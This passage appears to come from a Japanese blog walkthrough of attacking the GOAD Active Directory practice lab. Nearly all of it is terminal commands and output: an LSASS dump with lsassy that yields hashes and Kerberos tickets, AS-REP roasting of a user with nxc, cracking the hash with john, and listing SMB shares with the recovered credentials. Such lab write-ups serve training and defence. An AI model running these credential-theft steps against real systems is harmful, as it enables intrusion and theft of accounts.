</span></span><span class=line><span class=cl> <span class=mi>0030</span>   <span class=nx>CD</span> <span class=mi>4</span><span class=nx>D</span> <span class=nx>D6</span> <span class=mi>36</span> <span class=mi>6</span><span class=nx>A</span> <span class=mi>35</span> <span class=mi>24</span> <span class=mi>2</span><span class=nx>D</span>  <span class=nx>A0</span> <span class=nx>EB</span> <span class=mi>0</span><span class=nx>F</span> <span class=mi>8</span><span class=nx>E</span> <span class=mi>3</span><span class=nx>F</span> <span class=mi>52</span> <span class=mi>81</span> <span class=nx>C9</span>   <span class=p>.</span><span class=nx>M</span><span class=mf>.6</span><span class=nx>j5$</span><span class=o>-</span><span class=p>....</span><span class=o>?</span><span class=nx>R</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=nx>NL$KM</span><span class=o>:</span><span class=mi>223401760170309388</span><span class=nx>a76bb2874359690e41bd220a0ccc233a5bb674cb90d63514cad8454af0db72d5cf3ba1ed7f3a98cd4dd6366a35242da0eb0f8e3f5281c9</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>_SC_MSSQL$SQLEXPRESS</span> 
</span></span><span class=line><span class=cl><span class=nx>north</span><span class=p>.</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>sql_svc</span><span class=o>:</span><span class=nx>YouWillNotKerboroast1ngMeeeeee</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Cleaning</span> <span class=nx>up</span><span class=p>...</span> 
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Stopping</span> <span class=nx>service</span> <span class=nx>RemoteRegistry</span>
</span></span></code></pre></div><p>続いてはlsassyを使ってLSASSの情報を取得してみる</p><p><a href=https://github.com/login-securite/lsassy>https://github.com/login-securite/lsassy</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>proxychains</span> <span class=nx>lsassy</span> <span class=o>--</span><span class=nx>no</span><span class=o>-</span><span class=nx>pass</span> <span class=o>-</span><span class=nx>d</span> <span class=nx>NORTH</span> <span class=o>-</span><span class=nx>u</span> <span class=nx>EDDARD</span><span class=p>.</span><span class=nx>STARK</span> <span class=mf>192.168.56.22</span>             
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>proxychains</span><span class=p>]</span> <span class=nx>config</span> <span class=nx>file</span> <span class=nx>found</span><span class=o>:</span> <span class=err>/etc/proxychains4.conf</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>proxychains</span><span class=p>]</span> <span class=nx>preloading</span> <span class=o>/</span><span class=nx>usr</span><span class=o>/</span><span class=nx>lib</span><span class=o>/</span><span class=nx>x86_64</span><span class=o>-</span><span class=nx>linux</span><span class=o>-</span><span class=nx>gnu</span><span class=o>/</span><span class=nx>libproxychains</span><span class=p>.</span><span class=nx>so</span><span class=mf>.4</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>proxychains</span><span class=p>]</span> <span class=nx>DLL</span> <span class=nx>init</span><span class=o>:</span> <span class=nx>proxychains</span><span class=o>-</span><span class=nx>ng</span> <span class=mf>4.17</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>proxychains</span><span class=p>]</span> <span class=nx>Strict</span> <span class=nx>chain</span>  <span class=p>...</span>  <span class=mf>127.0.0.1</span><span class=o>:</span><span class=mi>1080</span>  <span class=p>...</span>  <span class=mf>192.168.56.22</span><span class=o>:</span><span class=mi>445</span>  <span class=p>...</span>  <span class=nx>OK</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>Authentication</span> <span class=nx>successful</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>proxychains</span><span class=p>]</span> <span class=nx>Strict</span> <span class=nx>chain</span>  <span class=p>...</span>  <span class=mf>127.0.0.1</span><span class=o>:</span><span class=mi>1080</span>  <span class=p>...</span>  <span class=mf>192.168.56.22</span><span class=o>:</span><span class=mi>445</span>  <span class=p>...</span>  <span class=nx>OK</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>Lsass</span> <span class=nx>dumped</span> <span class=k>in</span> <span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Windows</span><span class=err>\</span><span class=nx>Temp</span><span class=err>\</span><span class=mi>6</span><span class=nx>HGg19bP</span><span class=p>.</span><span class=nx>jpg</span> <span class=p>(</span><span class=mi>51439491</span> <span class=nx>Bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>Lsass</span> <span class=nx>dump</span> <span class=nx>deleted</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>NORTH</span><span class=err>\</span><span class=nx>robb</span><span class=p>.</span><span class=nx>stark</span>                        <span class=p>[</span><span class=nx>NT</span><span class=p>]</span> <span class=mi>831486</span><span class=nx>ac7f26860c9e2f51ac91e1a07a</span> <span class=o>|</span> <span class=p>[</span><span class=nx>SHA1</span><span class=p>]</span> <span class=mi>3</span><span class=nx>bea28f1c440eed7be7d423cefebb50322ed7b6c</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>NORTH</span><span class=err>\</span><span class=nx>CASTELBLACK$</span>                      <span class=p>[</span><span class=nx>NT</span><span class=p>]</span> <span class=mi>20425334</span><span class=nx>e9f78d883485696487ab1b67</span> <span class=o>|</span> <span class=p>[</span><span class=nx>SHA1</span><span class=p>]</span> <span class=mi>8</span><span class=nx>f582df44ed1c9e9c9d26be730c0b99226271cf4</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>north</span><span class=p>.</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>CASTELBLACK$</span>  <span class=p>[</span><span class=nx>PWD</span><span class=p>]</span> <span class=mi>1111806</span><span class=nx>e0bf8db391cb1c02c6411c34bce4b042253b862a6baa74e0a7654780999ff01c1d53d598ed08f168c35ca13303583a23343a965fa4b8f72afdfb63371b8f3d6aeb45d7e1e3c3f91d4f1eea5977a41030a4e83603b6c4d78db03728bc79b041b02fc53943f14ce014ed7fa7c335c7e150467b8dba0023256d6f376150c45c7bde0635e2d1ed53848685f8addd100827f320d24d0ca9102a6ca7824ecc7994f0ed433c325a7e72d20960ce3797570272218fbfb8868fba0037ace07459c34eb05cf05c00b9a78082676e45a1283da88772cb7881a96312998f49b2b92a4575a46be4a2d839a0efd7d6f5d0b30f0</span>                                                                                        
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>NORTH</span><span class=err>\</span><span class=nx>sql_svc</span>                           <span class=p>[</span><span class=nx>NT</span><span class=p>]</span> <span class=mi>84</span><span class=nx>a5092f53390ea48d660be52b93b804</span> <span class=o>|</span> <span class=p>[</span><span class=nx>SHA1</span><span class=p>]</span> <span class=mi>9</span><span class=nx>fd961155e28b1c6f9b3859f32f4779ad6a06404</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span><span class=err>\</span><span class=nx>robb</span><span class=p>.</span><span class=nx>stark</span>    <span class=p>[</span><span class=nx>TGT</span><span class=p>]</span> <span class=nx>Domain</span><span class=o>:</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span> <span class=o>-</span> <span class=nx>End</span> <span class=nx>time</span><span class=o>:</span> <span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>13</span> <span class=mi>12</span><span class=o>:</span><span class=mi>15</span> <span class=p>(</span><span class=nx>TGT_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_robb</span><span class=p>.</span><span class=nx>stark_krbtgt_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_d9e9f780</span><span class=p>.</span><span class=nx>kirbi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span><span class=err>\</span><span class=nx>robb</span><span class=p>.</span><span class=nx>stark</span>    <span class=p>[</span><span class=nx>TGT</span><span class=p>]</span> <span class=nx>Domain</span><span class=o>:</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span> <span class=o>-</span> <span class=nx>End</span> <span class=nx>time</span><span class=o>:</span> <span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>13</span> <span class=mi>12</span><span class=o>:</span><span class=mi>15</span> <span class=p>(</span><span class=nx>TGT_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_robb</span><span class=p>.</span><span class=nx>stark_krbtgt_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_5fb85f38</span><span class=p>.</span><span class=nx>kirbi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span><span class=err>\</span><span class=nx>sql_svc</span>       <span class=p>[</span><span class=nx>TGT</span><span class=p>]</span> <span class=nx>Domain</span><span class=o>:</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span> <span class=o>-</span> <span class=nx>End</span> <span class=nx>time</span><span class=o>:</span> <span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>13</span> <span class=mi>12</span><span class=o>:</span><span class=mi>15</span> <span class=p>(</span><span class=nx>TGT_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_sql_svc_krbtgt_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_1ac82095</span><span class=p>.</span><span class=nx>kirbi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span><span class=err>\</span><span class=nx>CASTELBLACK$</span>  <span class=p>[</span><span class=nx>TGT</span><span class=p>]</span> <span class=nx>Domain</span><span class=o>:</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span> <span class=o>-</span> <span class=nx>End</span> <span class=nx>time</span><span class=o>:</span> <span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>13</span> <span class=mi>12</span><span class=o>:</span><span class=mi>15</span> <span class=p>(</span><span class=nx>TGT_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_CASTELBLACK$_krbtgt_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_e55cd434</span><span class=p>.</span><span class=nx>kirbi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span><span class=err>\</span><span class=nx>CASTELBLACK$</span>  <span class=p>[</span><span class=nx>TGT</span><span class=p>]</span> <span class=nx>Domain</span><span class=o>:</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span> <span class=o>-</span> <span class=nx>End</span> <span class=nx>time</span><span class=o>:</span> <span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>13</span> <span class=mi>12</span><span class=o>:</span><span class=mi>15</span> <span class=p>(</span><span class=nx>TGT_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_CASTELBLACK$_krbtgt_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_c9464f19</span><span class=p>.</span><span class=nx>kirbi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span><span class=err>\</span><span class=nx>CASTELBLACK$</span>  <span class=p>[</span><span class=nx>TGT</span><span class=p>]</span> <span class=nx>Domain</span><span class=o>:</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span> <span class=o>-</span> <span class=nx>End</span> <span class=nx>time</span><span class=o>:</span> <span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>13</span> <span class=mi>12</span><span class=o>:</span><span class=mi>15</span> <span class=p>(</span><span class=nx>TGT_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_CASTELBLACK$_krbtgt_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_63039232</span><span class=p>.</span><span class=nx>kirbi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span><span class=err>\</span><span class=nx>CASTELBLACK$</span>  <span class=p>[</span><span class=nx>TGT</span><span class=p>]</span> <span class=nx>Domain</span><span class=o>:</span> <span class=nx>NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL</span> <span class=o>-</span> <span class=nx>End</span> <span class=nx>time</span><span class=o>:</span> <span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>13</span> <span class=mi>12</span><span class=o>:</span><span class=mi>15</span> <span class=p>(</span><span class=nx>TGT_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_CASTELBLACK$_krbtgt_NORTH</span><span class=p>.</span><span class=nx>SEVENKINGDOMS</span><span class=p>.</span><span class=nx>LOCAL_dd82f6bc</span><span class=p>.</span><span class=nx>kirbi</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=mi>18</span> <span class=nx>Kerberos</span> <span class=nx>tickets</span> <span class=nx>written</span> <span class=nx>to</span> <span class=o>/</span><span class=nx>home</span><span class=o>/</span><span class=nx>kali</span><span class=o>/</span><span class=p>.</span><span class=nx>config</span><span class=o>/</span><span class=nx>lsassy</span><span class=o>/</span><span class=nx>tickets</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>192.168.56.22</span> <span class=mi>5</span> <span class=nx>masterkeys</span> <span class=nx>saved</span> <span class=nx>to</span> <span class=o>/</span><span class=nx>home</span><span class=o>/</span><span class=nx>kali</span><span class=o>/</span><span class=p>.</span><span class=nx>config</span><span class=o>/</span><span class=nx>lsassy</span><span class=o>/</span><span class=nx>masterkeys</span><span class=p>.</span><span class=nx>txt</span>
</span></span></code></pre></div><p>とwinterfellのAdministrator権限は取得できた</p><h2 id=braavos>braavos<a hidden class=anchor aria-hidden=true href=#braavos>#</a></h2><p>bloodhoundでASREPRoastが可能なユーザーを見たところ、ESOSS.LOCAL/MISSANDEIが見つかった。</p><p>ASREPRoastを仕掛けてみる。</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>nxc</span> <span class=nx>ldap</span> <span class=mf>192.168.56.23</span> <span class=o>-</span><span class=nx>u</span> <span class=nx>missandei</span> <span class=o>-</span><span class=nx>p</span> <span class=s1>&#39;&#39;</span> <span class=o>--</span><span class=nx>asreproast</span> <span class=nx>asreproast</span><span class=p>.</span><span class=nx>hash</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.23</span>   <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Standard</span> <span class=nx>Evaluation</span> <span class=mi>14393</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>BRAAVOS</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>LDAP</span>        <span class=mf>192.168.56.23</span>   <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=nx>$krb5asrep$23$missandei</span><span class=err>@</span><span class=nx>ESSOS</span><span class=p>.</span><span class=nx>LOCAL</span><span class=o>:</span><span class=nx>dcdfca025e409115dac3015ad2bdad49$8d5164d380201364641c6765135d0f1f396f15de39d107f3a23685f1b6aaacd52c765146c336f31d9e33d59d614cfc1c05e0bc2bd414dcdee30acf84fef1d469d411ecadb1ef16ba740692505fb983c5d335bd8d3c120f28f3476ef566a517629863f24e68cd0d56ce56bd0b617b1bacaeb375d4b06a726809f6fef115cf8eecd0337611e4259618593628c5058b5d86e9b994b555340086d4f72c57f9954dfd159e8e071d415b2e8bf9e85a3990e300b7253d3f0673c2e317f549dada4fc4b80c6f298f9bc296f1fb077ddcf7aa31e9592b98bd7f11c572d0132b4fc8b38ce5543ba9415b28bc163e42</span>
</span></span></code></pre></div><p>johnにかける</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/braavos]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>john</span> <span class=o>--</span><span class=nx>wordlist</span><span class=o>=</span><span class=err>/usr/share/wordlists/rockyou.txt asreproast.hash             </span>
</span></span><span class=line><span class=cl><span class=nx>Using</span> <span class=k>default</span> <span class=nx>input</span> <span class=nx>encoding</span><span class=o>:</span> <span class=nx>UTF</span><span class=o>-</span><span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=nx>Loaded</span> <span class=mi>1</span> <span class=nx>password</span> <span class=nx>hash</span> <span class=p>(</span><span class=nx>krb5asrep</span><span class=p>,</span> <span class=nx>Kerberos</span> <span class=mi>5</span> <span class=nx>AS</span><span class=o>-</span><span class=nx>REP</span> <span class=nx>etype</span> <span class=mi>17</span><span class=o>/</span><span class=mi>18</span><span class=o>/</span><span class=mi>23</span> <span class=p>[</span><span class=nx>MD4</span> <span class=nx>HMAC</span><span class=o>-</span><span class=nx>MD5</span> <span class=nx>RC4</span> <span class=o>/</span> <span class=nx>PBKDF2</span> <span class=nx>HMAC</span><span class=o>-</span><span class=nx>SHA1</span> <span class=nx>AES</span> <span class=mi>256</span><span class=o>/</span><span class=mi>256</span> <span class=nx>AVX2</span> <span class=mi>8</span><span class=nx>x</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=nx>Will</span> <span class=nx>run</span> <span class=mi>4</span> <span class=nx>OpenMP</span> <span class=nx>threads</span>
</span></span><span class=line><span class=cl><span class=nx>Press</span> <span class=s1>&#39;q&#39;</span> <span class=nx>or</span> <span class=nx>Ctrl</span><span class=o>-</span><span class=nx>C</span> <span class=nx>to</span> <span class=nx>abort</span><span class=p>,</span> <span class=nx>almost</span> <span class=nx>any</span> <span class=nx>other</span> <span class=nx>key</span> <span class=k>for</span> <span class=nx>status</span>
</span></span><span class=line><span class=cl><span class=nx>fr3edom</span>          <span class=p>(</span><span class=nx>$krb5asrep$23$missandei</span><span class=err>@</span><span class=nx>ESSOS</span><span class=p>.</span><span class=nx>LOCAL</span><span class=p>)</span>     
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=nx>g</span> <span class=mi>0</span><span class=o>:</span><span class=mi>00</span><span class=o>:</span><span class=mi>00</span><span class=o>:</span><span class=mi>01</span> <span class=nx>DONE</span> <span class=p>(</span><span class=mi>2024</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>19</span> <span class=mi>16</span><span class=o>:</span><span class=mi>58</span><span class=p>)</span> <span class=mf>0.8333</span><span class=nx>g</span><span class=o>/</span><span class=nx>s</span> <span class=mi>1496</span><span class=nx>Kp</span><span class=o>/</span><span class=nx>s</span> <span class=mi>1496</span><span class=nx>Kc</span><span class=o>/</span><span class=nx>s</span> <span class=mi>1496</span><span class=nx>KC</span><span class=o>/</span><span class=nx>s</span> <span class=nx>franciene</span><span class=p>..</span><span class=nx>found9tion</span>
</span></span><span class=line><span class=cl><span class=nx>Use</span> <span class=nx>the</span> <span class=s2>&#34;--show&#34;</span> <span class=nx>option</span> <span class=nx>to</span> <span class=nx>display</span> <span class=nx>all</span> <span class=k>of</span> <span class=nx>the</span> <span class=nx>cracked</span> <span class=nx>passwords</span> <span class=nx>reliably</span>
</span></span><span class=line><span class=cl><span class=nx>Session</span> <span class=nx>completed</span><span class=p>.</span>
</span></span></code></pre></div><p><code>missandei/fr3edom</code> という認証情報を手に入れた</p><p>共有されているSMBの内容を見てみる</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/braavos]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>nxc</span> <span class=nx>smb</span> <span class=nx>braavos</span> <span class=o>-</span><span class=nx>u</span> <span class=nx>missandei</span> <span class=o>-</span><span class=nx>p</span> <span class=nx>fr3edom</span> <span class=o>-</span><span class=nx>k</span> <span class=o>--</span><span class=nx>shares</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=nx>braavos</span>         <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Standard</span> <span class=nx>Evaluation</span> <span class=mi>14393</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>BRAAVOS</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=nx>braavos</span>         <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>missandei</span><span class=o>:</span><span class=nx>fr3edom</span> 
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=nx>braavos</span>         <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Enumerated</span> <span class=nx>shares</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=nx>braavos</span>         <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=nx>Share</span>           <span class=nx>Permissions</span>     <span class=nx>Remark</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=nx>braavos</span>         <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=o>-----</span>           <span class=o>-----------</span>     <span class=o>------</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=nx>braavos</span>         <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=nx>ADMIN$</span>                          <span class=nx>Remote</span> <span class=nx>Admin</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=nx>braavos</span>         <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=nx>all</span>             <span class=nx>READ</span><span class=p>,</span><span class=nx>WRITE</span>      <span class=nx>Basic</span> <span class=nx>RW</span> <span class=nx>share</span> <span class=k>for</span> <span class=nx>all</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=nx>braavos</span>         <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=nx>C$</span>                              <span class=nx>Default</span> <span class=nx>share</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=nx>braavos</span>         <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=nx>CertEnroll</span>      <span class=nx>READ</span>            <span class=nx>Active</span> <span class=nx>Directory</span> <span class=nx>Certificate</span> <span class=nx>Services</span> <span class=nx>share</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=nx>braavos</span>         <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=nx>IPC$</span>                            <span class=nx>Remote</span> <span class=nx>IPC</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=nx>braavos</span>         <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=kr>public</span>          <span class=nx>READ</span><span class=p>,</span><span class=nx>WRITE</span>      <span class=nx>Basic</span> <span class=nx>Read</span> <span class=nx>share</span> <span class=k>for</span> <span class=nx>all</span> <span class=nx>domain</span> <span class=nx>users</span>
</span></span></code></pre></div><p>impacket-smbclientで見てみるとADCSのファイルを読み込めそう</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad/braavos]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>impacket</span><span class=o>-</span><span class=nx>smbclient</span> <span class=o>-</span><span class=nx>k</span> <span class=o>-</span><span class=nx>no</span><span class=o>-</span><span class=nx>pass</span> <span class=err>@</span><span class=nx>braavos</span><span class=p>.</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span>       
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.12.0</span><span class=p>.</span><span class=nx>dev1</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2023</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Type</span> <span class=nx>help</span> <span class=k>for</span> <span class=nx>list</span> <span class=k>of</span> <span class=nx>commands</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>ls</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>No</span> <span class=nx>share</span> <span class=nx>selected</span>
</span></span><span class=line><span class=cl><span class=err>#</span> <span class=nx>shares</span>
</span></span><span class=line><span class=cl><span class=nx>ADMIN$</span>
</span></span><span class=line><span class=cl><span class=nx>all</span>
</span></span><span class=line><span class=cl><span class=nx>C$</span>
</span></span><span class=line><span class=cl><span class=nx>CertEnroll</span>
</span></span><span class=line><span class=cl><span class=nx>IPC$</span>
</span></span><span class=line><span class=cl><span class=kr>public</span>
